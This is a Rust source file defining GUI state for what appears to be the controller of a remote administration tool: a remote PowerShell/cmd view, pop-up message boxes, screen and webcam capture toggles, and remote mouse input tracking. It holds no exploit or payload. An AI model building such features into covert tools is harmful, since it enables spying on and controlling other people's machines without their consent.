use std::time::Instant;

use egui::{ColorImage, TextureHandle};
use shared::commands::CaptureQuality;

pub struct MsgboxView {
    pub title: String,
    pub text: String,
}
pub struct PowerShellView {
    pub powershell: bool, // false for cmd
    pub input: String,
    pub output: String,
}
impl Default for MsgboxView {
    fn default() -> Self {
        Self {
            title: String::from("Title"),
            text: String::from("Text"),
        }
    }
}

pub struct ClientViewCaptureState {
    pub screen: bool,
    pub webcam: bool,
    //pub mic: bool,
}
impl Default for ClientViewCaptureState {
    fn default() -> Self {
        Self {
            screen: false,
            webcam: false,
            //mic: false,
        }
    }
}

pub struct ClientViewInputState {
    pub active: bool,
    pub clicking: bool,
    pub last_position: Option<(f32, f32)>,
    pub last_update: Option<Instant>,
}

pub struct ClientViewCapture {
    pub quality: CaptureQuality,
    pub max_scale: f32,
    pub scale: f32,
    pub data: Option<ColorImage>,
}
pub struct ClientViewCaptures {
    pub screen: ClientViewCapture,
    pub webcam: ClientViewCapture,
}
pub struct ClientViewTextures {
    pub screen: Option<TextureHandle>,
    pub webcam: Option<TextureHandle>,
}
